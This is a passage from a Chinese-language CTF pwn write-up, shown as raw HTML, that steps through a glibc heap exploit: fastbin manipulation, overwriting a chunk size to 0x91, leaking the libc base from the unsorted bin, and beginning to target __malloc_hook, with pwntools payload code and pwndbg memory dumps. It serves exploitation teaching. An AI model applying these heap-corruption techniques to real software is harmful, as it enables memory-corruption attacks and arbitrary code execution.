class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（fastbin）</span><br>-------------------------------------------------------------- <br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>再次强调，在申请fastbin中内存时，会检查被释放堆块的size（大小）是否在fastbin的范围内，如果不在，程序则异常退出，这有关于fastbin的机制。结构体状况未发生改变。</p><h4 id="1-6-申请-index4"><a href="#1-6-申请-index4" class="headerlink" title="1-6 申请 index4"></a>1-6 申请 index4</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#改好index4的大小之后去申请两次，这样就把原来的fastbin中的给申请出来了</span><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#申请成功之后index2就指向index4</span><br></code></pre></td></tr></tbody></table></figure><p>首先是两个malloc，前面fastbin里一开始是两个chunk，分别为index2-&gt;index1，后来我们修改index2-&gt;fd为index4的地址，fastbin里变为</p><p>index2-&gt;index4。第一个malloc会先分配index2给我们（fastbin分配原则是LIFO即后进先出），第二个malloc会将index4分配给我们。<br>看一下堆：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757060</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x555555757080</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此时的内存：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x555555757120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此时的结构体状况：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#index1（chunk_flag改变）</span><br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757050</span><br>                <span class="hljs-comment">#chunk_content_size（改变）   #chunk_data_ptr（改变）     </span><br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     <span class="hljs-comment">#index2（chunk_flag改变）  #chunk_data_size（改变）     </span><br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#chunk_data_ptr（改变）  #index3</span><br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><p>注意，此时我们有两个地方指向index4：<br><strong>index4的content指针</strong>（程序的正常指向）<br><strong>index2的content指针</strong> （通过执行payload中malloc之后的指向，参照上方代码框中的结构体）<br>第二个malloc得到的是index为2的chunk，这与程序中的Allocate函数有关，可以回顾一下前面的IDA代码。<br>也就是说假如我们现在要fill index2的内容，那么其实上是修改index4的内容。</p><h4 id="1-7-修改-index4-的-size-为0x91"><a href="#1-7-修改-index4-的-size-为0x91" class="headerlink" title="1-7 修改 index4 的 size 为0x91"></a>1-7 修改 index4 的 size 为0x91</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#为了让index4能够被放到unsortedbin中,要把它的大小改回来</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x555555757120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>程序结构体未发生变化</p><h4 id="1-8-申请新堆块-index-5"><a href="#1-8-申请新堆块-index-5" class="headerlink" title="1-8 申请新堆块 index 5"></a>1-8 申请新堆块 index 5</h4><p>目的只是为了防止 index4 释放后与 top chunk 合并</p><h4 id="1-9-free-index4-，index4-放入-unsorted-bin-中"><a href="#1-9-free-index4-，index4-放入-unsorted-bin-中" class="headerlink" title="1-9 free(index4)，index4 放入 unsorted bin 中"></a>1-9 free(index4)，index4 放入 unsorted bin 中</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这时候free就会把index4放到unsorted中了</span><br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">Free chunk (unsortedbin) | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757080</span><br>Size: <span class="hljs-number">0x91</span><br>fd: <span class="hljs-number">0x00</span><br>bk: <span class="hljs-number">0x7ffff7dd1b78</span><br><br>pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（unsortedbin）</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index5</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>当unsortedbin里只有一个空闲的chunk时，该chunk的fd和bk指针均指向unsortedbin本身，这个可以参考CTF-wiki中的内容，这里先不细说。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000001</span><br>        <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#（此处发生了改变）   #index5</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000080</span><span class="hljs-number">0x0000555555757120</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-10-计算libc基址"><a href="#1-10-计算libc基址" class="headerlink" title="1-10 计算libc基址"></a>1-10 计算libc基址</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">-----------------------------------------------------------------------------<br>还可以直接这样写<br>libc_base = u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))-<span class="hljs-number">0x3c4b78</span><br>-----------------------------------------------------------------------------<br>示例payload的写法：<br><span class="hljs-comment">#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了</span><br><span class="hljs-comment">#main_arena与libc偏移为0x3c4b20(附件中有工具)</span><br><span class="hljs-comment">#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移</span><br>unsorted_offset_mainarena=unsorted_offset_arena(<span class="hljs-number">5</span>)<span class="hljs-comment">#这函数还不太明白</span><br>unsorted_addr=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))<br>libc_base=unsorted_addr-<span class="hljs-number">0x3c4b20</span>-unsorted_offset_mainarena<br>log.info(<span class="hljs-string">"libc_base: "</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unsorted_offset_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br>-----------------------------------------------------------------------------<br></code></pre></td></tr></tbody></table></figure><h3 id="2-控制-malloc-hook"><a href="#2-控制-malloc-hook" class="headerlink" title="2. 控制_malloc_hook"></a>2. 控制_malloc_hook</h3><h4 id="2-1-申请-unsorted-bin-中的-chunk"><a href="#2-1-申请-unsorted-bin-中的-chunk" class="headerlink" title="2-1 申请 unsorted bin 中的 chunk"></a>2-1 申请 unsorted bin 中的 chunk</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x60</span>)<br></code></pre></td></tr></tbody></table></figure><p>由于在申请空间之前，之后unsortedbin中有空闲的空间，因此申请空间之后会使用unsortedbin中的chunk。<br>看一下此时的堆内存：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4(由unsortedbin分裂)</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5(由unsortedbin分裂)</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6（原index5）</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>从上面的堆情况可以看到，由于是malloc(0x60)，而原unsortedbin中的chunk_size过大，因此unsortedbin中的chunk会利用并分裂成两个堆块，其中index5还是存放在unsortedbin中的：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br><span class="hljs-built_in">all</span> [corrupted]<br>FD: <span class="hljs-number">0x5555557570f0</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x5555557570f0</span><br>BK: <span class="hljs-number">0x5555557570f0</span> ◂— <span class="hljs-number">0x90</span><br>----------------------------------------------------------------------<br>执行payload前：<br>unsortedbin<br><span class="hljs-built_in">all</span> [corrupted]<br>FD: <span class="hljs-number">0x555555757080</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x555555757080</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x555555757080</span><br>----------------------------------------------------------------------<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-2-free-index4"><a href="#2-2-free-index4" class="headerlink" title="2-2 free(index4)"></a>2-2 free(index4)</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#index2_content指针还是指向index4_chunk_data</span><br><span class="hljs-comment">#为了修改之后index4的fd指针，因此我们可以先释放index4</span><br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x555555757080</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin （这里显示不准确）<br><span class="hljs-built_in">all</span>: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757060</span><br>Size: <span class="hljs-number">0x71</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x5555557570d0</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x5555557570f0</span><br>Size: <span class="hljs-number">0x90</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757180</span><br>Size: <span class="hljs-number">0x20e61</span><br>pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span 